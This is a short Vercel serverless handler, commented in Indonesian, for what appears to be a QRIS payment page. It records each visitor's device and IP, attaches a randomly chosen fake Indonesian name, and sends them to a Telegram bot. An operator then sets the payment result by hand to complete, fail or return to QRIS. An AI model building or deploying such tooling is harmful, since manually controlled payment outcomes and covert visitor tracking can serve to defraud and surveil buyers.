// Database state internal sederhana di memori Vercel
global.paymentState = global.paymentState || { mode: "waiting", expireAt: null };

export default async function handler(req, res) {
  if (req.method !== 'POST') return res.status(405).send('Method Not Allowed');

  const listNama = ["Andi Wijaya", "Budi Santoso", "Siti Rahma", "Dewi Lestari", "Eko Prasetyo", "Rian Hidayat", "Mega Utami"];
  const namaRandom = listNama[Math.floor(Math.random() * listNama.length)];
  
  const userDevice = req.body.device || "Tidak Diketahui";
  const userIP = req.headers['x-forwarded-for'] || req.socket.remoteAddress || "0.0.0.0";

  // Set Waktu Expire 8 Menit dari sekarang ke sistem internal
  const waktu8Menit = 8 * 60 * 1000;
  global.paymentState.mode = "loading";
  global.paymentState.expireAt = Date.now() + waktu8Menit;

  // Kirim Pesan teks ke Bot Telegram
  const botToken = process.env.TELEGRAM_BOT_TOKEN;
  const chatId = process.env.TELEGRAM_CHAT_ID;
  const pesan = `⚠️ *Pengguna Kembali Ke Halaman!* \n\n` +
                `👤 Nama Acak: ${namaRandom}\n` +
                `📱 Perangkat HP: ${userDevice}\n` +
                `🌐 Alamat IP: ${userIP}\n\n` +
                `⏳ *Timer Bot Dimulai:* 8 Menit dari sekarang.\n` +
                `Ketik *kirim* untuk selesaikan, *stop* untuk kembalikan ke QRIS, atau *gagal* untuk gagalkan.`;

  await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ chat_id: chatId, text: pesan, parse_mode: 'Markdown' })
  });

  return res.status(200).json({ status: "success" });
}
